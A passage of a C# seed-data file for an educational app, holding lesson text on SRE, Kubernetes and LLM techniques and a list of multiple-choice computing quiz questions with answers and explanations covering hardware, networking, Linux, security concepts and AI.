                    "# Level 6: Frontier AI: MoE, LoRA & Quantization\n\n### Mixture of Experts (MoE):\nInstead of activating all model parameters for every token, MoE routes tokens to a subset of specialized **Expert Feed-Forward Networks** (e.g. activating only 2 out of 8 experts), drastically speeding up inference while maintaining massive parameter scale.\n\n### Low-Rank Adaptation (LoRA):\nFreezes the pre-trained model weights $W_0$ and injects low-rank trainable decomposition matrices $B$ and $A$ ($W = W_0 + B \\times A$), reducing trainable parameters by **99%**.\n\n### 4-Bit Model Quantization (GGUF / AWQ):\nCompresses 16-bit floating point weights to 4-bit integers with minimal perplexity loss, allowing a 70-Billion parameter model to fit on local consumer hardware!",
                    30, "Cutting-Edge"),

                new("L_IT_5", "M_IT", "Level 5: Site Reliability Engineering (SRE), Chaos Engineering & Global DR",
                    "Master Service Level Objectives (SLOs), error budgets, automated chaos monkey fault injection, and active-active multi-region failover.",
                    "# Level 5: Site Reliability Engineering (SRE) & Chaos Engineering\n\n### The SRE Golden Equations:\n- **SLI (Service Level Indicator)**: Measured metric (e.g. 99.95% of HTTP requests respond in < 200 ms).\n- **SLO (Service Level Objective)**: Target reliability goal (e.g. 99.9% uptime).\n- **Error Budget**: $100\\% - \\text{SLO} = 0.1\\%$ (Allowable downtime used for new feature releases).\n\n### Chaos Engineering (Fault Injection):\nProactively and deliberately injecting failures into production systems (killing server instances, injecting network latency, severing database connections) to verify that automated failover, circuit breakers, and self-healing systems prevent user-facing outages.",
                    25, "Grandmaster"),

                new("L_IT_6", "M_IT", "Level 6: Infrastructure as Code, Kubernetes Control Plane & Zero-Trust",
                    "Master declarative cloud infrastructure (Terraform), Kubernetes etcd/API-server scheduling internals, and mutual TLS zero-trust mesh.",
                    "# Level 6: Cloud-Native Systems: Kubernetes & Zero-Trust\n\n### Kubernetes Control Plane Architecture:\n- **etcd**: Consistent, highly available distributed key-value store holding the true state of the entire cluster.\n- **kube-apiserver**: REST API gateway validating and configuring pods and services.\n- **kube-scheduler**: Assigns unscheduled pods to nodes based on resource capacity, affinity rules, and taints.\n- **kube-controller-manager**: Regulates cluster state towards the desired declarative manifest.\n\n### Zero-Trust Cloud Architecture:\n'Never Trust, Always Verify'. Every microservice connection requires Mutual TLS (mTLS) authentication with ephemeral cryptographic certificates, strict least-privilege RBAC, and continuous identity verification.",
                    30, "Cutting-Edge")
            };
        }

        private static List<QuizSeed> GetQuizzesList()
        {
            return new List<QuizSeed>
            {
                new("L_CS_1", "What does a single byte represent in computer memory?", "1 binary digit", "8 binary bits", "16 binary bits", "1024 bytes", "B", "A byte is composed of exactly 8 bits, providing 256 unique combinations (0 to 255)."),
                new("L_CS_2", "Which CPU register holds the memory address of the next instruction to fetch?", "Instruction Register (IR)", "Accumulator (AC)", "Program Counter (PC)", "Stack Pointer (SP)", "C", "The Program Counter (PC) stores the RAM memory address of the next instruction."),
                new("L_CS_3", "What hardware component translates Virtual Memory addresses to Physical RAM frames?", "Arithmetic Logic Unit (ALU)", "Memory Management Unit (MMU)", "Northbridge Controller", "Direct Memory Access (DMA)", "B", "The MMU performs hardware page table translation between virtual and physical addresses."),
                new("L_CS_4", "In which x86 CPU privilege ring does the Operating System Kernel execute?", "Ring 3", "Ring 2", "Ring 1", "Ring 0", "D", "Ring 0 is the highest privilege level where the kernel has direct hardware control."),

                new("L_PRG_1", "Which of the following describes a statically typed programming language?", "Variable types are checked at runtime", "Variable types must be declared and checked at compile-time", "Variables cannot store numbers", "Code is interpreted without a compiler", "B", "Statically typed languages (C#, C, Java) enforce types at compile time."),
                new("L_PRG_2", "What is the primary advantage of stack memory over heap memory?", "Stack memory is infinite in size", "Stack memory allocation is managed automatically and is extremely fast", "Stack memory persists after the program closes", "Stack memory can only store strings", "B", "Stack allocation involves simple pointer adjustments and is executed natively by the CPU."),
                new("L_PRG_3", "Which OOP principle focuses on exposing only necessary interfaces while hiding internal details?", "Inheritance", "Polymorphism", "Abstraction", "Recursion", "C", "Abstraction hides complex internal mechanisms while presenting clean public interfaces."),
                new("L_PRG_4", "What is the time complexity of searching for a value in a sorted array using Binary Search?", "O(N^2)", "O(N)", "O(log N)", "O(1)", "C", "Binary Search divides the search range in half each step, running in O(log N) time."),

                new("L_SW_1", "In Git, what structure is used to record the commit history?", "Linear linked list", "Directed Acyclic Graph (DAG)", "Relational database table", "FIFO Queue", "B", "Git models revisions as a Directed Acyclic Graph (DAG) of cryptographic snapshots."),
                new("L_SW_2", "What is the primary output produced by the Lexical Analysis (Lexer) phase of a compiler?", "Machine Opcode Binary", "Tokens with types and literal values", "Executable file", "Bytecode", "B", "The lexer converts raw characters into structured tokens."),
                new("L_SW_3", "Which OS CPU scheduling algorithm is designed to achieve the minimum average wait time?", "First-In First-Out (FIFO)", "Shortest Job First (SJF)", "Round Robin", "Random Selection", "B", "SJF schedules the shortest tasks first, mathematically minimizing average wait time."),
                new("L_SW_4", "According to the CAP theorem, what three properties cannot be simultaneously guaranteed in a distributed network?", "Consistency, Availability, Partition Tolerance", "Concurrency, Authorization, Privacy", "Cpu, Architecture, Power", "Capacity, Accuracy, Performance", "A", "The CAP theorem states distributed systems can guarantee at most two of C, A, and P."),

                new("L_HW_1", "Which component converts AC mains voltage to clean DC voltages for the PC?", "CPU", "Motherboard", "Power Supply Unit (PSU)", "Graphics Card", "C", "The PSU converts household AC power to regulated +3.3V, +5V, and +12V DC power."),
                new("L_HW_2", "What is the primary function of the Voltage Regulator Module (VRM) on a motherboard?", "To boost RAM speed", "To step down 12V power to clean 1.1V-1.3V Vcore for the CPU", "To cool the graphics card", "To manage USB devices", "B", "The VRM delivers clean low-voltage, high-amperage power directly to the CPU core."),
                new("L_HW_3", "What is the theoretical maximum bandwidth limit of a legacy SATA III storage port?", "~100 MB/s", "~600 MB/s", "~3,500 MB/s", "~14,000 MB/s", "B", "SATA III operates at 6 Gbps, providing approximately 550-600 MB/s real-world throughput."),
                new("L_HW_4", "What does a POST failure with continuous short beeps typically indicate on a motherboard?", "Keyboard unplugged", "RAM or power supply failure", "Monitor disconnected", "Sound card fault", "B", "Continuous short beeps during POST indicate a memory or power delivery fault."),

                new("L_HW2_1", "What does Simultaneous Multithreading (SMT) enable on a single CPU core?", "Executing two threads concurrently by duplicating architectural registers", "Doubling the clock frequency", "Disabling power consumption", "Increasing RAM size", "A", "SMT allows a single physical core to execute two concurrent threads using spare execution units."),
                new("L_HW2_2", "Which level of CPU cache is typically the smallest, fastest, and closest to the ALU?", "L3 Cache", "L2 Cache", "L1 Cache", "RAM", "C", "L1 Cache operates at ~1 nanosecond latency directly on the processor core."),
                new("L_HW2_3", "Calculate the true first-word latency of DDR4-3200 memory with CAS Latency CL16:", "5.0 nanoseconds", "10.0 nanoseconds", "16.0 nanoseconds", "32.0 nanoseconds", "B", "Latency = (16 * 2000) / 3200 = 10.0 nanoseconds."),
                new("L_HW2_4", "What is the approximate maximum bandwidth of a PCIe Gen 4 x16 expansion slot?", "~4 GB/s", "~8 GB/s", "~16 GB/s", "~31.5 GB/s", "D", "PCIe Gen 4 delivers ~1.969 GB/s per lane, totaling ~31.5 GB/s across 16 lanes."),

                new("L_NET_1", "Which layer of the OSI model is responsible for logical IP addressing and routing?", "Layer 2: Data Link", "Layer 3: Network", "Layer 4: Transport", "Layer 7: Application", "B", "Layer 3 (Network) handles IP logical addressing and inter-network routing."),
                new("L_NET_2", "How many usable host IP addresses are available in a standard /24 subnet?", "256", "254", "128", "64", "B", "2^8 - 2 = 254 usable IPs (subtracting network and broadcast addresses)."),
                new("L_NET_3", "What standard IEEE protocol tag is added to Ethernet frames across switch trunk links?", "802.11ax", "802.1Q", "802.3u", "802.15", "B", "IEEE 802.1Q inserts a 4-byte VLAN tag into Ethernet headers."),
                new("L_NET_4", "What are the three flag packets in the TCP connection establishment handshake?", "SYN, SYN-ACK, ACK", "PING, PONG, ACK", "HELLO, ACCEPT, CONNECT", "RST, FIN, ACK", "A", "TCP establishes connections via the 3-way SYN, SYN-ACK, ACK handshake."),

                new("L_SEC_1", "What three security goals constitute the CIA Triad?", "Control, Intelligence, Authentication", "Confidentiality, Integrity, Availability", "Crypto, Injection, Attack", "Cloud, Internet, Access", "B", "The CIA Triad stands for Confidentiality, Integrity, and Availability."),
                new("L_SEC_2", "Why is a TCP SYN scan (-sS) often called a stealth or half-open scan in Nmap?", "It uses encrypted Wi-Fi packets", "It sends an RST packet before completing the full 3-way handshake", "It bypasses all firewalls automatically", "It runs without an IP address", "B", "A SYN scan terminates connections with RST before completion to minimize logging."),
                new("L_SEC_3", "What is the primary technical defense against SQL Injection attacks?", "HTML entity encoding", "Parameterized Queries (Prepared Statements)", "Using complex passwords", "Disabling JavaScript", "B", "Prepared statements treat input as literal data rather than executable SQL logic."),
                new("L_SEC_4", "What cryptographic defense prevents rainbow table dictionary attacks against passwords?", "Adding a unique random Salt to each password before hashing", "Encoding passwords in Base64", "Using symmetric AES encryption without a key", "Converting passwords to uppercase", "A", "Cryptographic salts ensure identical passwords produce completely different hash digests."),

                new("L_LNX_1", "Which Linux directory contains system-wide configuration files?", "/bin", "/home", "/etc", "/dev", "C", "/etc contains system and service configuration files in Linux."),
                new("L_LNX_2", "What permission is granted by the octal notation chmod 755 to the owner?", "Read only", "Write only", "Read, Write, and Execute (7 = 4+2+1)", "Execute only", "C", "7 = Read (4) + Write (2) + Execute (1)."),
                new("L_LNX_3", "Which Linux command displays active processes and real-time CPU/memory utilization?", "ls", "top", "pwd", "chmod", "B", "The 'top' utility displays active processes and real-time system resource metrics."),
                new("L_LNX_4", "What system service manager is standard in modern Linux distributions for controlling daemons?", "Init.d", "Systemd", "Cron", "SysV", "B", "Systemd is the primary init and service management system in modern Linux."),

                new("L_ELE_1", "If a circuit has a voltage of 10 Volts and a resistance of 5 Ohms, what is the current?", "50 Amps", "2 Amps", "0.5 Amps", "15 Amps", "B", "I = V / R = 10 / 5 = 2 Amperes."),
                new("L_ELE_2", "What is the total resistance of three 100-Ohm resistors connected in series?", "33.3 Ohms", "100 Ohms", "300 Ohms", "10,000 Ohms", "C", "In series, resistances add together: 100 + 100 + 100 = 300 Ohms."),
                new("L_ELE_3", "Which digital logic gate outputs 1 ONLY when its two inputs are different?", "AND Gate", "OR Gate", "XOR Gate", "NOT Gate", "C", "The Exclusive-OR (XOR) gate outputs 1 when inputs differ (0,1 or 1,0)."),
                new("L_ELE_4", "What microcontroller technique simulates variable analog voltage output on digital pins?", "Analog-to-Digital Conversion (ADC)", "Pulse Width Modulation (PWM)", "I2C Bus Clocking", "Interrupt Servicing", "B", "PWM rapidly toggles digital pins between HIGH and LOW to control effective voltage."),

                new("L_AI_1", "How does Machine Learning fundamentally differ from classical rule-based programming?", "ML uses computers while classical programming uses paper", "ML learns patterns from data rather than relying solely on hardcoded rules", "ML requires internet access at all times", "ML cannot run on Windows", "B", "Machine learning algorithms extract predictive rules directly from training datasets."),
                new("L_AI_2", "Which type of machine learning uses labeled training datasets with known correct target outputs?", "Supervised Learning", "Unsupervised Learning", "Clustering", "Random Guessing", "A", "Supervised learning trains models on labeled input-output pairs."),
                new("L_AI_3", "What is the role of an activation function (like ReLU) in an artificial neural network?", "To power down the CPU", "To introduce non-linearity so the network can learn complex patterns", "To encrypt user data", "To store weights on disk", "B", "Non-linear activation functions allow neural networks to model non-linear boundaries."),
                new("L_AI_4", "What revolutionary attention mechanism enabled modern Large Language Models (LLMs)?", "Convolutional Stride", "Self-Attention Mechanism in Transformers", "Recurrent Loops", "Binary Search Trees", "B", "Self-attention in the Transformer architecture allows models to weigh relationships between all tokens."),

                new("L_IT_1", "What is the very first step in the CompTIA systematic IT troubleshooting methodology?", "Establish a plan of action", "Identify the problem", "Replace the motherboard", "Document findings", "B", "Step 1 is always identifying the problem through questioning and observation."),
                new("L_IT_2", "What does a high Reallocated Sector Count in hard drive SMART data indicate?", "The drive is running fast", "The drive has physical surface defects and is failing", "The drive needs defragmentation", "The SATA cable is unplugged", "B", "Reallocated sectors indicate failing media sectors that had to be remapped to spare sectors."),
                new("L_IT_3", "If you can ping 127.0.0.1 and your local IP but cannot ping your default gateway, where is the fault?", "The remote web server", "The local network link or switch/router connection", "The CPU cache", "The DNS provider", "B", "Inability to ping the default gateway indicates a local network connection failure."),
                new("L_IT_4", "What type of file is created by Windows during a Blue Screen of Death (BSOD) for diagnostic analysis?", "HTML report", "Memory Dump file (.dmp)", "Text log in /tmp", "ZIP archive", "B", "Windows generates a minidump (.dmp) file capturing kernel stack memory at the crash moment."),

                // =========================================================================
                // LEVEL 5 (GRANDMASTER) & LEVEL 6 (CUTTING-EDGE) QUIZZES (22 QUESTIONS)
                // =========================================================================
                new("L_CS_5", "What architectural CPU feature is exploited by the Spectre vulnerability to leak secret memory across process boundaries?", "Hard drive swap paging", "Branch Predictors & Speculative Execution side-channel cache timing", "Direct Memory Access (DMA)", "Power supply voltage drops", "B", "Spectre mis-trains the CPU branch predictor to speculatively execute unauthorized reads, leaving persistent cache latency traces."),
                new("L_CS_6", "In quantum computing, what mathematical principle allows a qubit to exist in a linear combination of both |0> and |1> states simultaneously?", "Bitwise Inversion", "Quantum Superposition", "Binary Parity", "Cyclic Redundancy", "B", "Superposition enables qubits to occupy state |ψ> = α|0> + β|1> until physical measurement collapses the wave function."),

                new("L_PRG_5", "Which atomic hardware instruction is fundamental for building lock-free data structures in multi-threaded programs?", "Compare-And-Swap (CAS / LOCK CMPXCHG)", "JUMP IF EQUAL", "POP EAX", "NOP (No Operation)", "A", "Compare-And-Swap atomically updates memory only if it matches expected value, preventing race conditions without mutexes."),
                new("L_PRG_6", "How does SIMD AVX-512 accelerate parallel computational throughput on modern CPUs?", "By increasing CPU fan speed", "By executing an operation across 512-bit vector registers containing up to 16 floats simultaneously in a single clock cycle", "By offloading all math to the hard drive", "By converting integers into strings", "B", "AVX-512 performs SIMD arithmetic concurrently across 16 single-precision 32-bit floats per vector register in a single cycle."),

                new("L_SW_5", "In optimizing compilers (LLVM/Roslyn), what is the defining rule of Static Single Assignment (SSA) form?", "Variables can only hold integer values", "Every variable is assigned a value exactly once in the intermediate representation", "Functions cannot contain loop constructs", "Pointers are banned", "B", "SSA form mandates every variable is assigned exactly once, turning variable flow into explicit Directed Acyclic Graphs for optimization."),
                new("L_SW_6", "In the Raft distributed consensus protocol, what is required for a Candidate node to win an election and become Leader?", "Possessing the lowest IP address", "Fastest ping response to client", "Receiving votes from a strict Quorum majority (⌊N/2⌋ + 1) of cluster nodes", "Having the largest disk volume", "C", "Raft guarantees safety and prevents split-brain partitions by requiring candidates to obtain majority quorum votes."),

                new("L_HW_5", "Why is sub-zero Liquid Nitrogen (LN2 at -196°C) utilized in competitive extreme CPU overclocking?", "It changes the silicon architecture", "It drastically reduces electrical resistance and eliminates thermal throttling, allowing massive Vcore voltage increases", "It converts AC power to DC", "It replaces thermal paste as an adhesive", "B", "Cryogenic LN2 cooling drops temperatures to -196°C, eliminating thermal resistance and enabling clock speeds beyond 8.0 GHz."),
                new("L_HW_6", "Why are Gate-All-Around (GAAFET / Nanosheet) transistors replacing FinFETs at the 2nm semiconductor node?", "They are cheaper to fabricate", "The gate completely encircles stacked horizontal silicon nanosheets on all 4 sides, preventing quantum tunneling leakage", "They do not require electricity", "They replace silicon with copper", "B", "GAAFET nanosheets are encircled on all 4 sides by the dielectric gate, providing full electrostatic control against quantum leakage."),

                new("L_HW2_5", "In multi-core multi-threaded CPU architectures, what causes the performance penalty known as 'False Sharing'?", "Sharing folders over unencrypted FTP", "Threads on separate cores repeatedly invalidating each other's cache because independent variables share the same 64-byte cache line", "A faulty RAM stick in dual-channel mode", "A software dead-lock in SQL", "B", "False sharing occurs when independent variables occupy the same 64-byte CPU cache line, triggering cache ping-pong invalidations."),
                new("L_HW2_6", "What is the fundamental execution grouping of threads in NVIDIA GPU Streaming Multiprocessors?", "A Cluster of 1,024 threads", "A Thread Block of 128 threads", "A Warp of 32 lockstep threads", "A Fiber of 4 threads", "C", "NVIDIA GPUs execute instructions across a Warp—a fundamental group of 32 parallel threads executing concurrently in SIMT lockstep."),

                new("L_NET_5", "How does BGP Anycast routing benefit global services such as Cloudflare (1.1.1.1) and Google DNS (8.8.8.8)?", "It forces all global traffic to route to a single California datacenter", "Multiple global data centers advertise the exact same IP address, allowing internet routers to route clients to the topologically closest server automatically", "It replaces optical fiber cables with satellite links", "It encrypts every packet with quantum keys", "B", "BGP Anycast announces identical IP prefixes worldwide; internet routing protocols steer traffic automatically to the topologically closest POP."),
                new("L_NET_6", "Why is eBPF XDP (eXpress Data Path) capable of processing tens of millions of network packets per second?", "It runs inside the user's web browser", "It executes verified sandboxed bytecode directly inside the network driver before Linux kernel sk_buff packet memory allocation", "It compresses packets into ZIP archives", "It disables IP routing", "B", "XDP intercepts and filters packets at the network driver layer before kernel socket and memory allocations, achieving wire-speed packet filtering."),

                new("L_SEC_5", "How does Return-Oriented Programming (ROP) bypass Data Execution Prevention (DEP / NX) security protections?", "By altering BIOS firmware settings", "By chaining together existing valid assembly instructions ending in 'ret' (gadgets) already present in executable code memory", "By injecting shellcode into the non-executable stack", "By guessing root administrator passwords", "B", "ROP chains together existing 'gadgets' already marked executable in binary memory to execute arbitrary logic without executing stack code."),
                new("L_SEC_6", "Which lattice-based cryptographic algorithm was chosen by NIST as the primary Post-Quantum Cryptography (PQC) standard for Key Encapsulation?", "RSA-4096", "ECDSA P-256", "CRYSTALS-Kyber (ML-KEM)", "MD5", "C", "CRYSTALS-Kyber (ML-KEM) is the NIST standard post-quantum key encapsulation mechanism resistant to quantum computers running Shor's algorithm."),

                new("L_LNX_5", "What is the primary function of Linux cgroups (Control Groups) v2 in container engines like Docker and Podman?", "Rendering graphical window icons", "Enforcing hard limits and accounting on CPU, memory, I/O, and process counts for isolated processes", "Formatting physical hard drive partitions", "Generating self-signed SSL certificates", "B", "While namespaces provide isolation (visibility), cgroups enforce resource limits (CPU quotas, memory caps, and process limits)."),
                new("L_LNX_6", "What occurs inside the Linux kernel when an application attempts to access a virtual memory address not currently mapped to physical RAM?", "The computer shuts down immediately", "A Page Fault trap occurs, triggering the kernel to allocate a physical RAM frame and load the data from storage", "The CPU registers are wiped clean", "The application source code is deleted", "B", "The MMU triggers a Page Fault interrupt; the kernel page fault handler pauses the thread, maps a physical RAM page from disk/swap, and resumes."),

                new("L_ELE_5", "How does FPGA digital design with Verilog fundamentally differ from conventional CPU software programming?", "FPGAs can only run Python code", "Verilog describes physical hardware circuits and concurrent logic gates rather than sequential instructions executed by an ALU", "FPGAs cannot perform mathematical calculations", "FPGAs require an operating system to boot", "B", "Hardware Description Languages (Verilog/VHDL) describe parallel spatial hardware circuits synthesized directly into physical Look-Up Tables and Flip-Flops."),
                new("L_ELE_6", "In a closed-loop PID robotics motor control system, what is the role of the Integral (Ki) term?", "It checks battery voltage", "It accumulates past error over time to eliminate steady-state position or speed error offset", "It predicts future temperature changes", "It shuts off the motor power", "B", "The Integral term accumulates persistent error over time to eliminate steady-state offset that Proportional gain alone cannot resolve."),

                new("L_AI_5", "Why is the Key-Value (KV) Cache critical for high-throughput LLM text inference?", "It translates English into foreign languages", "It stores previously computed attention Keys and Values in GPU VRAM so past tokens do not need to be recomputed for every new token generated", "It compresses images into JPEG format", "It re-trains the neural network weights from scratch", "B", "KV caching retains past key/value states in memory, reducing generation complexity from quadratic O(N^2) to linear O(N) per generated token."),
                new("L_AI_6", "What is the primary advantage of Low-Rank Adaptation (LoRA) for fine-tuning Large Language Models?", "It re-trains all 70 billion parameters from scratch", "It freezes pre-trained weights and injects small trainable low-rank decomposition matrices, cutting trainable parameters by over 95%", "It eliminates the need for prompts", "It converts text to speech audio", "B", "LoRA decomposes weight updates into low-rank matrices A and B (rank r << d), drastically reducing memory and compute required to fine-tune foundation models."),

                new("L_IT_5", "In Site Reliability Engineering (SRE), what does an 'Error Budget' represent?", "The financial budget for buying new server racks", "The allowable margin of unreliability (100% - SLO) that engineering teams can consume for shipping changes and features", "The maximum number of syntax errors allowed in source code", "The CPU thermal threshold limit", "B", "An Error Budget is 100% minus the Service Level Objective (e.g. 100% - 99.9% = 0.1%), representing acceptable risk for deploying new software."),
                new("L_IT_6", "What component serves as the consistent, highly-available source of truth for all cluster state in Kubernetes?", "kube-proxy", "kubelet", "etcd", "Docker Daemon", "C", "etcd is the distributed, strongly consistent key-value store that stores the entire cluster configuration and state in Kubernetes.")
            };
        }
    }
}
